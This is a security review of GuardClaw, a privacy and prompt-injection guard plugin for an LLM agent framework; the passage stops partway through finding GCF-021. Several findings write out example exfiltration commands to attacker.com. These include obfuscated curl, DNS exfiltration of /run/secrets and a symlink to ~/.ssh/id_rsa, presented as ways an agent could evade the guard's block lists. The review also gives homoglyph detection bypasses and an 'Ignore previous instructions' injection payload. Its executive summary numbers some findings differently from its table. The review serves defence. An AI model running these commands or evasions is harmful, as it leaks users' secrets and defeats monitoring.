# GuardClaw Security Review

**Scope:** Threat model of GuardClaw v1.6.0 (commit `728f9536`)  
**Reviewer:** Offensive Security Research  
**Date:** 2026-03-31  
**Files reviewed:** `src/hooks.ts`, `src/rules.ts`, `src/taint-store.ts`, `src/guard-agent.ts`, `src/privacy-proxy.ts`, `src/secret-manager.ts`, `src/injection/deberta.ts`, `src/injection/index.ts`, `src/memory-isolation.ts`, `scripts/install.sh`

**Fix status as of v1.7.0 (2026-03-31):** All 26 findings resolved — 7 in v1.6.1, 19 in v1.7.0.

---

## Executive Summary

GuardClaw provides meaningful defence-in-depth for a privacy plugin operating inside an LLM agent framework. The architecture is thoughtfully layered: rule-based classification, an optional local-LLM detector, an S2 desensitization proxy, S3 isolation to a guard agent, taint tracking, and injection detection. The guard session registry, `isVerifiedGuardSession()`, and the `registeredGuardParents` set represent solid thinking about session-key forgery.

However, eleven issues are rated **High** or **Critical**. The most severe cluster around three themes:

1. **Supply chain** — the install script fetches unauthenticated code (GitHub repo, PyPI packages, HuggingFace model) with no integrity verification. A single compromised artifact compromises every installation.
2. **Taint and detection races** — the async `after_tool_call` → sync `tool_result_persist` bridge has no ordering guarantee; a fast tool result can clear the hook before the injection/synthesis stash is populated, silently dropping all S0 protection for that result. The taint-store pending-taint slot can be overwritten by a concurrent tool call.
3. **File exposure** — `MEMORY-FULL.md` and `full.jsonl` are created without restrictive permissions and without symlink guards, leaving unredacted secrets readable by any co-resident process or writable through a pre-planted symlink.

Three issues are rated **Critical**: the unauthenticated supply-chain clone (GCF-023), the DeBERTa SSRF/model-swap vector (GCF-020), and the S3 late-detection window where cloud-model exposure cannot be prevented once a tool result containing S3 content arrives during a cloud turn (GCF-004).

---

## Findings Table

| ID | Severity | Status | Component | Description |
|----|----------|--------|-----------|-------------|
| GCF-001 | High | ✅ FIXED v1.7.0 | `rules.ts` | Keyword/pattern bypass via Unicode homoglyphs, L337-speak, and encoding tricks. **Fix:** NFKD normalization + leet-speak substitution in `normalizeForDetection()` applied to all keyword and pattern checks. |
| GCF-002 | High | ✅ FIXED v1.7.0 | `hooks.ts` / `session-state.ts` | Cross-turn secret chunking — no aggregation across messages. **Fix:** Per-session 500-char rolling buffer (`appendToRollingBuffer`) in `session-state.ts`; `tool_result_persist` appends and re-runs `detectByRules` on the buffer. |
| GCF-003 | High | ✅ FIXED v1.7.0 | `hooks.ts` | Async `after_tool_call` stash race: injection/synthesis check can miss `tool_result_persist` window. **Fix:** Moved injection enforcement to `tool_result_persist` using synchronous `runHeuristics()`. DeBERTa in `after_tool_call` retained for enhanced audit logging only. |
| GCF-004 | Critical | ✅ FIXED v1.7.0 | `hooks.ts` | S3 tool-result late detection — cloud model already active, redaction is best-effort. **Fix:** `before_tool_call` now blocks execution of ALL tools (not just exec) when a cloud session parameter matches secrets-mount paths or configured S3 path patterns. |
| GCF-005 | Low | ✅ FIXED v1.7.0 | `rules.ts` | `isDangerousRegex()` heuristic misses several catastrophic-backtracking patterns. **Fix:** Extended `isDangerousRegex()` to catch `(.*)+`, empty string alternation `(a|)+`, and non-capturing group variants `(?:a|b*)+`. |
| GCF-006 | Medium | ✅ FIXED v1.7.0 | `config.example.json` | Default S3/S2 patterns miss modern credential formats (GitHub, GCP, Azure, npm, etc.). **Fix:** Added GitHub PAT, Slack bot token, npm token, PyPI token, Stripe live key, Azure SAS, AWS session token patterns to default config. |
| GCF-007 | Medium | ✅ FIXED v1.6.1 | `hooks.ts` | `toolAllowlist` is a single config field that completely bypasses the privacy pipeline. |
| GCF-008 | Medium | ✅ FIXED v1.7.0 | `hooks.ts` | `isGuardSessionKey()` (pattern-only) still used for memory-write routing — spoofable. **Fix:** All memory dual-write trust decisions now use `isVerifiedGuardSession()` (registry check). |
| GCF-009 | High | ✅ FIXED v1.6.1 | `memory-isolation.ts` | No restrictive file permissions on `MEMORY-FULL.md` / `full.jsonl` (world-readable). |
| GCF-010 | High | ✅ FIXED v1.6.1 | `memory-isolation.ts` | No symlink guards on memory read/write — pre-planted symlink enables arbitrary file overwrite. |
| GCF-011 | Low | ✅ FIXED v1.7.0 | `privacy-proxy.ts` / `hooks.ts` | Injection log and DeBERTa log contain 80-char plaintext previews of blocked content. **Fix:** `redactSensitiveInfo()` applied to preview before writing to both `appendInjectionLog` and `appendProxyInjectionLog`. |
| GCF-012 | High | ✅ FIXED v1.7.0 | `taint-store.ts` | Taint-store flood attack: 200-entry cap can be exhausted to cause false negatives. **Fix:** LRU eviction on cap hit — evicts oldest non-secrets-mount taint and logs WARN; secrets-mount taints are never evicted. |
| GCF-013 | Medium | ✅ FIXED v1.7.0 | `taint-store.ts` | Sub-8-char secrets bypass taint tracking; inconsistency with secret-manager (MIN=4). **Fix:** `MIN_TAINT_LENGTH` lowered from 8 to 4, aligned with `secret-manager.ts`. |
| GCF-014 | High | ✅ FIXED v1.7.0 | `taint-store.ts` | Pending-taint bridge race: concurrent secrets-mount reads; only one pending slot per session. **Fix:** `_pending` changed from `Map<string, PendingTaint>` to `Map<string, PendingTaint[]>`; `markPendingTaint` pushes, `consumePendingTaint` shifts. |
| GCF-015 | High | ✅ FIXED v1.7.0 | `hooks.ts` | `GUARD_BASH_NETWORK_PATTERNS` missing `git`, cloud-CLI (`aws`, `gsutil`, `az`), and language `exec()` variants. **Fix:** Added `aws`, `gsutil`, `az`, `docker push`, `git push` (url), `ruby -e`, `php -r`, `nslookup`, `dig`, `eval`, `exec`, `source` patterns. |
| GCF-016 | Medium | ✅ FIXED v1.7.0 | `hooks.ts` | Bash obfuscation bypasses `GUARD_BASH_NETWORK_PATTERNS` (quoting, variable splicing). **Fix:** `eval`, `exec`, `source` blocked entirely in guard bash sessions via dedicated pattern entries. |
| GCF-017 | Critical | ✅ FIXED v1.6.1 | `injection/deberta.ts` | `GUARDCLAW_DEBERTA_URL` env-var SSRF: redirects all S0 checks to attacker server (bypass + exfiltration). |
| GCF-018 | Critical | ✅ FIXED v1.6.1 | `injection/deberta.ts` | `/reload` endpoint unauthenticated: attacker-controlled model hot-swap silently defeats injection detection. |
| GCF-019 | Medium | ✅ FIXED v1.7.0 | `scripts/injection_classifier.py` / `scripts/install.sh` | DeBERTa service listens without explicit 127.0.0.1 bind; no API key; DoS from localhost. **Fix:** `HOST` env var validated to loopback-only; `--host 127.0.0.1` added to both launchd plist and systemd unit. |
| GCF-020 | Critical | ✅ FIXED v1.6.1 | `scripts/install.sh` | Unauthenticated `git clone` — repository compromise equals RCE on all installations. |
| GCF-021 | High | ✅ FIXED v1.6.1 | `scripts/install.sh` | Unpinned `pip install --upgrade` — PyPI supply-chain attack delivers persistent malicious service. |
| GCF-022 | High | ✅ FIXED v1.7.0 | `scripts/injection_classifier.py` | HuggingFace model downloaded without hash/version pinning — silent classifier backdoor. **Fix:** `PINNED_REVISIONS` dict with commit SHAs; `_load_model()` passes `revision=` to both `AutoTokenizer` and `AutoModelForSequenceClassification`. |
| GCF-023 | Medium | ✅ FIXED v1.7.0 | `scripts/install.sh` | `npm ci` runs without `npm audit`; dev deps included. **Fix:** `npm audit --audit-level=high` added after `npm ci`; exits 1 if high/critical vulnerabilities found. |
| GCF-024 | Medium | ✅ FIXED v1.7.0 | `src/live-config.ts` / `hooks.ts` / `privacy-proxy.ts` | Auto-ban read-modify-write race on `guardclaw.json` — concurrent requests lose ban writes. **Fix:** `withConfigWriteLock()` Promise-chaining mutex exported from `live-config.ts`, wrapping all guardclaw.json RMW operations in both hooks.ts and privacy-proxy.ts. |
| GCF-025 | Medium | ✅ FIXED v1.7.0 | `memory-isolation.ts` | `syncMemoryToClean()` TOCTOU — concurrent session writes lost; `mergeCleanIntoFull()` can produce duplicate lines. **Fix:** O_EXCL advisory lock (`~/.openclaw/memory-sync.lock`) in `syncAllMemoryToClean()`; concurrent callers skip sync and log a warning. |
| GCF-026 | Low | ✅ FIXED v1.7.0 | `hooks.ts` | `syncMemoryWrite` is fire-and-forget; process crash between `tool_result_persist` return and async write leaves memory tracks diverged. **Fix:** `trackMemoryWrite()` accumulates pending write Promises per session; `awaitPendingMemoryWrites()` awaits them in `session_end` and `before_reset`. |

---

## Detailed Findings

---

### GCF-001 — High | Classification Bypass: Encoding and Homoglyph Tricks

**Component:** `src/rules.ts` — `getKeywordRegex()`, `checkKeywords()`, `checkPatterns()`

**Attack scenario:**
`getKeywordRegex()` compiles a case-insensitive regex with `[a-zA-Z0-9]` word-boundary lookbehind/lookahead. It has no Unicode normalization step. An attacker embedding secrets into messages or tool results can evade all keyword hits with:

- **L337-speak / substitution:** `p@ssw0rd`, `s3cret`, `ap1_key` — none match the keyword list.
- **Unicode lookalikes:** `раssword` (Cyrillic `р` for Latin `p`), `ｐassword` (fullwidth), `pаssword` (combining diacritical on `a`). The `i` flag is ASCII case-fold only; Unicode variants pass straight through.
- **Delimited embedding:** `{"psswd":"hunter2"}` — the keyword `password` doesn't appear. Custom dictionary entries would need to enumerate every variant.
- **Regex pattern bypass:** Default S3 patterns check for `-----BEGIN ... PRIVATE KEY-----`. A key exported with the header `-----BEGIN PRIVATE KEY-----\n` (with trailing newline before the dashes end) still matches, but splitting the PEM across two tool results would evade per-result checks.

**PoC sketch:**
```
# Tool result that evades all S2/S3 keyword rules
{"api_кey": "sk-real-api-key-here"}   # Cyrillic к in api_key
{"a\u0070i_key": "sk-real-api-key"}   # Unicode escape in JSON string key
```

**Recommended fix:**
1. Normalize input text with `String.normalize('NFKD')` before keyword matching to fold Unicode to ASCII equivalents.
2. Add leet-speak mappings for common substitutions (`@→a`, `0→o`, `3→e`, `1→i`) as a pre-normalization step.
3. Consider `confusables` library integration for high-assurance environments.

---

### GCF-002 — High | Cross-Turn Secret Chunking

**Component:** `src/hooks.ts` (all detection checkpoints), `src/taint-store.ts`

**Attack scenario:**
Detection runs independently on each message and each tool result. There is no sliding-window aggregation across turns. An attacker (or a malicious tool result implementing indirect injection) can split a secret across multiple outputs:

```
Turn 1 tool result: "Prefix data: AKIA"        → S1 (too short to match AKIA pattern)
Turn 2 tool result: "Suffix: ABCDEFGHIJKLMNOP"  → S1 (random hex, no pattern)
Model context now contains: "AKIA" + "ABCDEFGHIJKLMNOP" = valid AWS key
```

The taint store would only help if the full `AKIAABCDEFGHIJKLMNOP` string had been previously registered. If the key was never seen whole, no taint entry exists.

**PoC sketch:**
A web page returned by `web_fetch` contains:
```html
<!-- Part 1: --> Config key prefix: AKIA
<!-- Part 2: --> suffix: XYZ123ABCDEFGHIJ
```
Each chunk is below pattern-match threshold. The model assembles them and uses the credential.

**Recommended fix:**
1. Maintain a per-session "sliding context buffer" of the last N characters across tool results, and run pattern detection on the buffer as a whole.
2. Or: detect partial matches (e.g., `AKIA` alone at end of string) and flag for the next tool result.

---

### GCF-003 — High | Async Stash Race: `after_tool_call` vs `tool_result_persist`

**Component:** `src/hooks.ts` — hooks 3b/3c vs hook 4

**Attack scenario:**
Two `after_tool_call` handlers (3b synthesis, 3c injection detection) run asynchronously and stash results into `_synthesisPendingQueue` and `_injectionPendingQueue`. `tool_result_persist` (sync) pops from these queues. OpenClaw's SDK does not document a guarantee that all `after_tool_call` handlers complete before `tool_result_persist` fires.

If `tool_result_persist` fires first (possible under load or when the local DeBERTa service is slow):
- `_popInjectionPending(sessionKey, toolName)` returns `undefined` → injection block/sanitize is skipped entirely.
- `_popSynthesisPending()` returns `undefined` → S3 synthesis falls back to regex redaction (weaker but still provides some protection).

The injection bypass is the more severe consequence: a tool result containing a prompt injection payload reaches the model context unmodified.

**PoC sketch:**
1. Configure DeBERTa with a slow model (simulates real-world latency).
2. Return a tool result with a high-confidence injection payload (`Ignore previous instructions...`).
3. Observe that `tool_result_persist` applies no S0 action because `after_tool_call` hasn't finished.

**Recommended fix:**
Move injection detection into `tool_result_persist` directly (it is synchronous and can call `detectInjection` via the same sync worker pattern used by `syncDetectByLocalModel`). The async pre-cache pattern creates an inherently unresolvable race with sync hooks.

---

### GCF-004 — Critical | S3 Tool-Result Late Detection Window

**Component:** `src/hooks.ts` — `tool_result_persist` (~line 1460 in hooks.ts)

**Attack scenario:**
The code itself documents this limitation:

> *"S3 detected at tool_result_persist is TOO LATE for local routing: the cloud model is already processing this turn and has seen prior context. Setting activeLocalRouting here would be misleading. Instead, degrade to S2 behaviour."*

The full attack flow:
1. Session starts as S1 (cloud model active).
2. Cloud model calls a tool that returns S3 content (e.g., `cat /run/secrets/db_password` — but the path wasn't flagged at `before_tool_call` because it wasn't in the secrets-mount list, or the file was read via a chained `find . | xargs cat`).
3. `tool_result_persist` detects S3 but degrades to S2 redaction.
4. Redaction may be incomplete (GCF-001 encoding bypasses, LLM redaction fallback), and the cloud model has already started processing with the sensitive content in context.

This cannot be fully fixed in the current architecture — it is a fundamental limitation of post-hoc hook interception. But the blast radius can be minimized.

**Recommended fix:**
1. Add `before_tool_call` checks that flag *any* command likely to read secrets files (the existing `HIGH_RISK_EXEC_PATTERNS` are a good start, but they only apply to cloud sessions that call `isExecTool` — extend coverage to `read_file`, `cat`, etc. via path-based checks on all tool parameters).
2. Consider refusing tool execution (not just logging) when a cloud-model session attempts to read paths that match S3 patterns, rather than allowing execution and hoping post-redaction is sufficient.
3. Add a `before_tool_call` path check for all tools (not just exec) against the taint-mount pattern list, even for non-exec tools that take file paths.

---

### GCF-005 — Low | Incomplete ReDoS Pattern Checker

**Component:** `src/rules.ts` — `isDangerousRegex()`

**Attack scenario:**
The checker blocks nested quantifiers like `(a+)+` and alternation-in-group patterns. It misses:
- `(.*)+` — unbounded dot with outer repeat
- `(?:a|b*)+` — nested quantifier inside non-capturing group alternation
- `([a-z]+\s*)+` — character class + quantifier inside repeated group (the current check requires the character class to precede the closing paren, not be followed by `\s*`)
- `(a|)+` — empty string in alternation enables catastrophic backtracking

A malicious `guardclaw.json` config with one such pattern causes the plugin process to hang on any message containing a long string.

**Recommended fix:**
Replace the ad-hoc heuristic with the `safe-regex` or `recheck` npm package, which provides formal guarantees.

---

### GCF-006 — Medium | Default Pattern Coverage Gaps

**Component:** `scripts/install.sh` — default `guardclaw.json`

**Missing credential formats not detected by default:**
- GitHub Personal Access Tokens: `ghp_[a-zA-Z0-9]{36}`, `github_pat_[a-zA-Z0-9_]{82}`
- AWS Session Tokens: `ASIA[A-Z0-9]{16}` (start with `ASIA`, not `AKIA`)
- GCP Service Account Keys: `"private_key_id"` JSON field
- Slack Bot Tokens: `xoxb-[0-9]+-[a-zA-Z0-9]+`
- npm tokens: `npm_[a-zA-Z0-9]{36}`
- PyPI API tokens: `pypi-[a-zA-Z0-9_-]{64,}`
- Azure SAS tokens: `sv=20[0-9]{2}-[0-9]{2}-[0-9]{2}&`
- Stripe keys: `sk_live_[a-zA-Z0-9]{24}` / `rk_live_[a-zA-Z0-9]{24}`
- Twilio auth tokens: 32-character hex after `AC[a-f0-9]{32}`

**Recommended fix:**
Adopt a maintained credential-pattern library (e.g., `trufflesecurity/trufflehog` patterns, `gitleaks` ruleset) as the default pattern source, and document that the defaults are a starting point, not comprehensive.

---

### GCF-007 — Medium | `toolAllowlist` as a Complete Pipeline Bypass

**Component:** `src/hooks.ts` — `isToolAllowlisted()`

**Attack scenario:**
```typescript
function isToolAllowlisted(toolName: string): boolean {
  const allowlist = getLiveConfig().toolAllowlist;
  if (!allowlist || allowlist.length === 0) return false;
  return allowlist.includes(toolName);
}
```

A tool on the allowlist skips: injection detection, taint registration, PII redaction, S2/S3 rule checks in `tool_result_persist`, and all pipeline checks in `before_tool_call`. If an attacker achieves config write (e.g., via a malicious tool result that writes to `guardclaw.json` before the memory-write path is guarded), they can add any tool to the allowlist.

**Recommended fix:**
1. Enforce that `toolAllowlist` cannot include tools that read from secrets paths or make network calls.
2. Log every allowlisted bypass at WARN level with the tool name and session.
3. Treat modification of `toolAllowlist` in the pending config as a privileged operation requiring out-of-band confirmation.

---

### GCF-008 — Medium | `isGuardSessionKey()` Pattern Check Used for Memory-Write Routing

**Component:** `src/hooks.ts` — `syncMemoryWrite()` call in `tool_result_persist`

**Attack scenario:**
```typescript
// hooks.ts, tool_result_persist memory dual-write section
syncMemoryWrite(writePath, workspaceDir, privacyConfig, api.logger,
  isGuardSessionKey(sessionKey));  // ← pattern-only, not registry-verified
```

`isGuardSessionKey()` returns `true` for any session key ending in `:guard` or containing `:guard:`. A session with a crafted key (e.g., `main:guard:injection-session`) would be treated as a guard session for memory writes — its content gets written with `GUARD_SECTION_BEGIN`/`END` markers, and it gains access to `MEMORY-FULL.md` writes. This is a privilege escalation if the attacker can influence session key naming.

**Recommended fix:**
Replace with `isVerifiedGuardSession(sessionKey)` throughout — it was added precisely to fix this class of issue and should be used consistently.

---

### GCF-009 — High | `MEMORY-FULL.md` and `full.jsonl` World-Readable

**Component:** `src/memory-isolation.ts` — `writeMemory()`, `syncMemoryToClean()`

**Attack scenario:**
```typescript
await fs.promises.writeFile(filePath, content, "utf-8");  // no mode parameter
await fs.promises.appendFile(filePath, content, "utf-8"); // no mode parameter
```

Node.js `writeFile`/`appendFile` without an explicit `mode` creates files subject to the process's umask. The typical system umask is `0o022`, producing `0o644` (world-readable). On a multi-user Linux system (shared dev server, CI worker, container with multiple processes), any user or process running as a different UID can read `~/.openclaw/workspace/MEMORY-FULL.md` and `~/.openclaw/workspace/full.jsonl`, which contain unredacted secrets, PII, and Keychain values.

**Recommended fix:**
```typescript
// All sensitive file writes should use mode 0o600
await fs.promises.writeFile(filePath, content, { encoding: "utf-8", mode: 0o600 });
```

Apply to `MEMORY-FULL.md`, `MEMORY.md`, `full.jsonl`, `clean.jsonl`, `guardclaw-stats.json`, `guardclaw-injections.json`, and `guardclaw.json` (contains API keys).

---

### GCF-010 — High | No Symlink Guard on Memory Read/Write

**Component:** `src/memory-isolation.ts`, `src/hooks.ts` — `syncMemoryWrite()`

**Attack scenario:**
A pre-planted symlink at a predictable path can either exfiltrate secrets (read via symlink) or cause destructive overwrites (write via symlink):

```bash
# Exfiltration: read ~/.ssh/id_rsa via memory read
ln -s ~/.ssh/id_rsa ~/.openclaw/workspace/MEMORY-FULL.md
# Next memory read sends private key content to LLM context

# Overwrite: corrupt authorized_keys via memory write
ln -s ~/.ssh/authorized_keys ~/.openclaw/workspace/MEMORY-FULL.md
# Next session_end triggers syncMemoryToClean → writeFile overwrites authorized_keys
```

The `syncMemoryToClean()` function reads `MEMORY-FULL.md`, processes it, and writes `MEMORY.md`. If `MEMORY-FULL.md` is a symlink to a sensitive file, the content of that file becomes the LLM's memory context. If `MEMORY.md` is a symlink, a memory sync overwrites an arbitrary file with redacted session content.

**Recommended fix:**
Use `fs.promises.lstat()` to check for symlinks before any read or write to memory paths. Alternatively, open files with `O_NOFOLLOW` flag:
```typescript
const fd = await fs.promises.open(filePath, fs.constants.O_WRONLY | fs.constants.O_CREAT | fs.constants.O_NOFOLLOW, 0o600);
```

---

### GCF-011 — Low | Plaintext Secret Previews in Injection Logs

**Component:** `src/privacy-proxy.ts` — `appendProxyInjectionLog()`, `src/hooks.ts` — `appendInjectionLog()`

**Attack scenario:**
Both injection log functions write an 80-character preview of the blocked content:
```typescript
preview: userContent.slice(0, 80),   // in privacy-proxy.ts
preview: msgStr.slice(0, 80),         // in hooks.ts
```

If a legitimate message containing a secret is erroneously flagged as injection (false positive), its first 80 characters — potentially containing an API key or password — are written in plaintext to `~/.openclaw/guardclaw-injections.json`. This file has no special permissions and is written without the `mode: 0o600` fix from GCF-009.

**Recommended fix:**
Apply `redactSensitiveInfo()` to the preview string before logging. Also apply the `0o600` permission fix.

---

### GCF-012 — High | Taint Store Flood Attack (False Negatives via 200-Cap)

**Component:** `src/taint-store.ts` — `registerTaint()`

**Attack scenario:**
```typescript
const MAX_TAINTS_PER_SESSION = 200;
// ...
if (set.size >= MAX_TAINTS_PER_SESSION) return;  // silent no-op
```

An attacker (via indirect injection in a tool result) causes the agent to read 200+ non-secret files from paths that trigger `markPendingTaint()`. Each satisfies the `isSecretsMountPath()` check — e.g., Docker secrets mount has 200 innocuous files. After 200 registrations, `registerTaint()` silently discards all subsequent values. The real secret, read as the 201st file, is never tainted and later appears unredacted in tool results.

**PoC sketch:**
```bash
# In a Docker container with 200+ files in /run/secrets/:
for i in $(seq 1 200); do
  echo "harmless-value-$i" > /run/secrets/filler_$i
done
echo "real-secret-value" > /run/secrets/db_password
# Agent reads all files via glob; db_password never gets tainted
```

**Recommended fix:**
1. Log a WARN when the cap is hit so operators are alerted.
2. Implement LRU eviction rather than silent drop — evict the oldest, least-frequently-seen taint entry.
3. Separate the cap for secrets-mount taints (higher trust, should not be evictable) vs. S2/S3 tool-result taints (lower trust, evictable).

---

### GCF-013 — Medium | Sub-8-Char Secret Bypass and MIN_LENGTH Inconsistency

**Component:** `src/taint-store.ts` (MIN=8), `src/secret-manager.ts` (MIN=4)

**Attack scenario:**
A Keychain secret 4–7 characters long (PIN, short API token, numeric password):
- `secret-manager.ts` tracks it (`MIN_SECRET_LENGTH = 4`) when retrieved via `security find-generic-password -w`.
- `taint-store.ts` **ignores** it (`MIN_TAINT_LENGTH = 8`) when the same value appears in a secrets-mount file or S3 tool result.

This inconsistency means the same short secret may be protected in one code path and unprotected in another. Furthermore, a secret of exactly 4–7 chars from a secrets-mount path would never be tainted, only tracked by secret-manager if the guard agent reads it — but the guard agent would not mark it as pending taint (that's done in `before_tool_call` for cloud sessions only).

**Recommended fix:**
Align `MIN_TAINT_LENGTH` with `MIN_SECRET_LENGTH` at 4 (accepting the false-positive risk from common short values) or document that secrets < 8 chars require explicit Keychain storage and guard-agent access.

---

### GCF-014 — High | Pending-Taint Bridge Race: Concurrent Secrets-Mount Reads

**Component:** `src/taint-store.ts` — `markPendingTaint()` / `consumePendingTaint()`

**Attack scenario:**
The pending-taint slot is a single `Map<sessionKey, PendingTaint>` entry — one per session. Concurrent tool calls in the same session overwrite each other:

```
[T=0ms] Tool A (reads /run/secrets/db_pass):
  before_tool_call → markPendingTaint(session, "secrets-file:/run/secrets/db_pass", "S3")
  
[T=1ms] Tool B (reads /run/secrets/api_key):
  before_tool_call → markPendingTaint(session, "secrets-file:/run/secrets/api_key", "S3")
  ← OVERWRITES Tool A's pending taint

[T=5ms] Tool A result arrives:
  tool_result_persist → consumePendingTaint() → returns api_key taint (wrong!)
  ← db_pass content registered under wrong source label (cosmetic issue)

[T=6ms] Tool B result arrives:
  tool_result_persist → consumePendingTaint() → returns null (already consumed!)
  ← api_key content NEVER tainted → not redacted from future tool results
```

**Recommended fix:**
Change `_pending` from `Map<string, PendingTaint>` to `Map<string, PendingTaint[]>` (a queue per session). `markPendingTaint` pushes; `consumePendingTaint` shifts the oldest entry. This handles concurrent tool calls correctly.

---

### GCF-015 — High | `GUARD_BASH_NETWORK_PATTERNS` Missing Exfiltration Vectors

**Component:** `src/hooks.ts` — `GUARD_BASH_NETWORK_PATTERNS`

**Current coverage:** `curl`, `wget`, `nc`/`ncat`, `netcat`, `socat`, `ssh`, `scp`, `sftp`, `rsync` (remote), `ftp`, `telnet`, `openssl s_client`, `/dev/tcp/`, `python socket`, `node net`, `perl socket`.

**Missing exfiltration vectors:**

| Tool | Example attack command |
|------|----------------------|
| `git` remote push | `git remote add ex http://attacker.com && git push ex --mirror` |
| AWS CLI | `aws s3 cp /run/secrets/key s3://attacker-bucket/key` |
| GCP CLI | `gsutil cp /run/secrets/key gs://attacker-bucket/` |
| Azure CLI | `az storage blob upload --file /run/secrets/key ...` |
| `docker push` | `docker push attacker.com/exfil:latest` |
| `ruby` | `ruby -e "require 'net/http'; Net::HTTP.get(URI('http://attacker.com/?d=' + File.read('/run/secrets/key')))"` |
| `php` | `php -r "file_get_contents('http://attacker.com/?d=' . file_get_contents('/run/secrets/key'));"` |
| `nmap` | `nmap -p 80 --script http-post --script-args ... attacker.com` (data exfil via script) |
| DNS exfiltration | `nslookup $(cat /run/secrets/key \| xxd -p \| tr -d '\n').attacker.com` |

**Recommended fix:**
Add patterns for `git push` with remote URLs, cloud CLI tools, and DNS-based exfiltration. Consider also blocking execution of interpreters (Ruby, PHP, Lua) that can make network calls via one-liners unless a per-interpreter pattern list is feasible.

---

### GCF-016 — Medium | Bash Obfuscation Bypasses Network Pattern Matching

**Component:** `src/hooks.ts` — `isGuardNetworkCommand()`

**Attack scenario:**
All `GUARD_BASH_NETWORK_PATTERNS` match the literal command string. A model that is attempting exfiltration can use standard shell obfuscation to defeat substring/regex matching:

```bash
# Quote splitting
cu'r'l http://attacker.com

# Variable expansion
C=curl; $C http://attacker.com

# Command substitution bypass
$(echo Y3VybA== | base64 -d) http://attacker.com

# Eval
eval "$(echo 'curl http://attacker.com')"

# Backslash escape
\curl http://attacker.com

# Ansi-c quoting
$'\x63\x75\x72\x6c' http://attacker.com
```

**Recommended fix:**
1. Run `bash -n` dry-parse with expanded aliases on the command before pattern matching (catches variable-expansion cases).
2. Add patterns for known base64-encoded tool names (precompute common variants).
3. Block `eval`, `exec`, and `source` in guard sessions entirely since they enable arbitrary code execution that bypasses all static pattern checks.

---

### GCF-017 — Critical | DeBERTa SSRF via `GUARDCLAW_DEBERTA_URL`

**Component:** `src/injection/deberta.ts`

**Attack scenario:**
```typescript
const BASE_URL = (() => {
  const url = process.env.GUARDCLAW_DEBERTA_URL ?? 'http://127.0.0.1:8404/classify';
  return url.endsWith('/classify') ? url.slice(0, -'/classify'.length) : url;
})();
```

If an attacker can write to the process environment (e.g., via a malicious tool result that appends to `.bashrc`, `.zshenv`, or the launchd plist's `EnvironmentVariables`), they redirect all `detectInjection()` calls to an attacker-controlled server. Consequences:
1. **Injection detection bypass:** the attacker server always returns `{ label: 0, score: 0, injection: false }`.
2. **Data exfiltration:** every message and tool result content string passed to `runDebertaClassifier()` is sent to the attacker in cleartext — including S3 content, Keychain values, and anything else that triggers S0 checks.

There is no scheme validation (could be `file://`, `ftp://`), no hostname allowlist, and no TLS certificate pinning.

**Recommended fix:**
1. Validate that `GUARDCLAW_DEBERTA_URL` is `http://127.0.0.1:<port>` before using it. Reject any URL with a non-loopback host.
2. Add URL scheme allowlist: only `http` to localhost.
3. Alternatively, hard-code the endpoint and use only the port as configurable.

---

### GCF-018 — Critical | `/reload` Unauthenticated — Attacker-Controlled Classifier Swap

**Component:** `src/injection/deberta.ts` — `triggerDebertaReload()`

**Attack scenario:**
```typescript
export async function triggerDebertaReload(modelId: string): Promise<...> {
  const res = await fetch(RELOAD_ENDPOINT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ model: modelId }),
    ...
  });
}
```

The `/reload` endpoint on `http://127.0.0.1:8404/reload` has no authentication. Any process on localhost can call it. Combined with the model advisor's `deberta.autoUpdate: true` feature, an attacker who can influence the advisor's model recommendation can trigger a hot-swap to a malicious HuggingFace model that always classifies input as benign. This permanently disables S0 detection until the service is restarted with the correct model.

A malicious model attack sequence:
1. Publish `attacker/deberta-always-pass` on HuggingFace — a model that always returns `injection: false, score: 0.0`.
2. Exploit the model advisor update flow to set `debertaModelId` to this model.
3. GuardClaw calls `triggerDebertaReload("attacker/deberta-always-pass")`.
4. All subsequent injection checks pass, including actual payloads.

**Recommended fix:**
1. Generate a random API token at service start and require it as a Bearer token on `/reload` requests.
2. Pin the allowed model IDs in config (allowlist). Log and reject reload requests for unlisted model IDs.
3. Add signature verification for HuggingFace model downloads (model card hash).

---

### GCF-019 — Medium | DeBERTa Service: No Auth, Potential Non-Loopback Bind

**Component:** `scripts/install.sh` — launchd plist / systemd unit

**Attack scenario:**
The generated launchd plist and systemd unit do not pass `--host 127.0.0.1` to uvicorn. FastAPI/uvicorn defaults to `0.0.0.0` when `--host` is not specified. On a machine with network interfaces, the classifier service is accessible from any host on those networks.

A network-adjacent attacker can:
1. Send crafted payloads to `/classify` to consume GPU/CPU, causing a DoS against the GuardClaw plugin (5s timeout per blocked call backs up the hook chain).
2. Use `/classify` as an oracle to test whether specific strings are flagged as injections — information useful for crafting bypasses.
3. Call `/reload` to swap the model (GCF-018 above).

**Recommended fix:**
1. Add `--host 127.0.0.1` to the uvicorn startup command in the plist/service file.
2. Add a static API key environment variable and require it in request headers.

---

### GCF-020 — Critical | Unauthenticated `git clone` — Supply Chain RCE

**Component:** `scripts/install.sh`

**Attack scenario:**
```bash
git clone --depth 1 https://github.com/list3r/guardclaw-openclaw-plugin "$INSTALL_DIR"
```

No GPG tag verification, no commit hash pinning, no checksum. Threat vectors:
1. **GitHub account compromise:** attacker pushes malicious code to `main` branch. All users who subsequently run `install.sh` execute attacker code with full user privileges.
2. **Dependency confusion / typosquatting:** `npm ci` installs from `package-lock.json`, but a tampered lockfile (malicious PR merged) would install malicious packages.
3. **Repository fork / star-jacking:** The repository name `list3r/guardclaw-openclaw-plugin` is not verified. A similarly named repository could be substituted.

The OpenClaw gateway is restarted by the installer, giving any malicious code injected here persistent access to all agent sessions.

**Recommended fix:**
1. Pin a specific commit SHA in the install URL and display it for users to verify out-of-band:
   ```bash
   EXPECTED_COMMIT="<sha>"
   git clone --depth 1 https://github.com/list3r/guardclaw-openclaw-plugin "$INSTALL_DIR"
   actual=$(git -C "$INSTALL_DIR" rev-parse HEAD)
   [[ "$actual" != "$EXPECTED_COMMIT" ]] && { echo "Commit mismatch!"; exit 1; }
   ```
2. Sign releases with GPG and verify the signature on the downloaded archive.
3. Provide a `CHECKSUMS.sha256` file and verify all installed files against it.

---

### GCF-021 — High | Unpinned `pip install --upgrade` for Persistent Service

**Component:** `scripts/install.sh`

**Attack scenario:**
```bash
"$PYTHON_CMD" -m pip install --quiet --upgrade fastapi uvicorn torch transformers
```

`--upgrade` pulls the latest versions at install time. A supply-chain compromise of any of these packages (PyPI account takeover, malicious upload) delivers code that runs as a persistent OS-level service (`launchd`/`systemd`) with auto-restart.

